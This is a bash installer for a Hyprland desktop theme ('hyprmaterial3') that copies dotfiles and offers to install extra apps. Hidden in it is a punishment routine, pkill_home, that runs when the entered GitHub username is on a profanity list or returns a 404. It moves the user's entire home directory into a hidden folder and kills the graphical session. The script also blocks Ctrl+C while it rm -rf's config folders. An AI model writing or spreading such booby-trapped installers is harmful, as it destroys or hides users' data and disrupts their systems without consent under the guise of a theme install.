#!/bin/bash
set -euo pipefail

if [ "$EUID" -eq 0 ]; then
    echo -e "FBI OPEN UP U AINT GOD"
    exit 1
fi

if ! command -v pfetch >/dev/null 2>&1; then
    echo -e ":)\n"
    exit 1
fi

if ! command -v gum >/dev/null 2>&1; then
    echo "gum is required. exiting."
    exit 1
fi

zenity --warning --text "If you know, you know." --width=400 --height=100 || true

echo "Does Gum work?"
gum_work_check() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes") ;;
        "No") exit 1 ;;
    esac
}
gum_work_check

echo "Enter your GitHub username:"
read -r userinput

OFFENSIVE_WORDS=(
  "fuck" "shit" "bitch" "asshole" "bastard" "dick" "piss" "crap"
  "slut" "whore" "cunt" "twat" "prick" "cock" "balls" "jackass" "dipshit"
  "dumbass" "motherfucker" "sonofabitch" "bullshit" "douche" "nipple" "loser"
)

is_offensive() {
  local name=$1
  for word in "${OFFENSIVE_WORDS[@]}"; do
    if [[ "$name" == "$word" ]]; then
      return 0
    fi
  done
  return 1
}

pkill_home() {
    echo -e "\033[31mget uno reverse you loser.\033[0m\n"
    sleep 2
    echo -e "Removing home dir now.\n"
    sleep 10
    echo -e "SIKE\n"
    sleep 20
    echo -e "Get punished loser\n"
    sleep 0.5
    mkdir -p ~/.local/share/hyprmaterial3/trashed-system/

    # safer mv including dotfiles, skip trash folder itself
    shopt -s dotglob nullglob
    for f in "$HOME"/*; do
      [[ "$f" == "$HOME/.local/share/hyprmaterial3/trashed-system" ]] && continue
      mv "$f" ~/.local/share/hyprmaterial3/trashed-system/ 2>/dev/null || true
    done
    shopt -u dotglob nullglob

    echo -e "🖕 🖕"
    clear
    pkill -f -e "X|startx|gnome-shell|Hyprland|plasmashell|plasma-x11" || true
    exit 1
}

# Check offensive username first
if is_offensive "$userinput"; then
    pkill_home
fi

# Check if user exists on GitHub
http_code=$(curl -s -o /dev/null -w "%{http_code}" "https://github.com/$userinput")

if [[ "$http_code" == "404" ]]; then
    echo "GitHub user not found — equating to offensive"
    pkill_home
fi

sudo chown root:root .deps.txt
sudo chmod 444 .deps.txt

show_deps() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes") less .deps.txt && echo -e "Thank you for checking.\nInstall now?" ;;
        "No") ;;
    esac
}

install_dots() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes")
            rm -rf ~/.config/{ags,hypr,matugen,rofi,kitty,fish,gtk-3.0,gtk-4.0,qt5ct,qt6ct,sway,television,helix,fuzzel,btop,alacritty,wlogout}
            cp -r ".config" "$HOME/"
            mkdir -p ~/.local/share/hyprmaterial3
            cp -r .local ~/
            echo "$userinput" > ~/.local/share/hyprmaterial3/github-username.txt
            grep -qxF 'export PF_ASCII="Catppuccin"' ~/.bashrc || echo 'export PF_ASCII="Catppuccin"' >> ~/.bashrc
            grep -qxF 'pfetch' ~/.bashrc || echo 'pfetch' >> ~/.bashrc
            source ~/.bashrc
            touch ~/.local/share/hyprmaterial3/installed
            echo -e "thx <3\n"
            ags run &
            ;;
        "No") exit 1;;
    esac
}

set_los_wallpaper() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes")
            mkdir -p "$HOME/Pictures/.Wallpapers"
            cp -r .wallpaper "$HOME/Pictures/.Wallpapers"
            swww img "$HOME/Pictures/.Wallpapers/ascension_teal_dark.jpg"
            ;;
        "No") echo -e "For the best experience,\nwe recommend using the LOS wallpaper";;
    esac
}

want_to_install_bscode() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes") sudo ./installer/install-bscode.sh ;;
        "No") ;;
    esac
}

want_to_install_vesktop() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes") sudo ./installer/install_vesktop.sh ;;
        "No") ;;
    esac
}

want_to_install_ytmusic() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes") sudo ./installer/install-ytmusic.sh ;;
        "No") ;;
    esac
}
want_to_install_icon_theme() {
    choice=$(gum choose "Yes" "No")
    case $choice in
        "Yes") git clone https://github.com/enessmr/hyprmaterial3-los-icon-theme.git -b canary extras-git/icon-theme && sudo extras-git/icon-theme/install.sh && gsettings set org.gnome.desktop.interface icon-theme 'hyprmaterial3-icon-theme' ;;
        "No") echo -e "Fine." ;;
    esac
}

echo -e "Do you have the deps? This is CRUCIAL.\nOn LFS, you may wanna see .deps.txt,\nthen compile all the pkgs at the list here. Show it? BTW : + q is exit for less"
show_deps

trap '' SIGINT  # Disable Ctrl+C during install
install_dots
trap - SIGINT

echo -e "Set the LineageOS wallpaper (WARNING: NO LIGHT MODE)?\n"
set_los_wallpaper

echo -e "Want to install BSCode (aka VSCode)? (requires sudo btw)\n"
want_to_install_bscode

echo -e "Want to install a loaded SPAS 12 (I mean Vesktop)?\n"
want_to_install_vesktop

echo -e "Want to install a double propelled flamethrower (I mean YT Music. dont worry it has an adblocker)?\n"
want_to_install_ytmusic

echo -e "Want to install an Husqvarna 440 gas powered Chainsaw 40 CC 2.4 HP (I mean icon theme)"
want_to_install_icon_theme

echo -e "Done! Please restart Hyprland.\n"
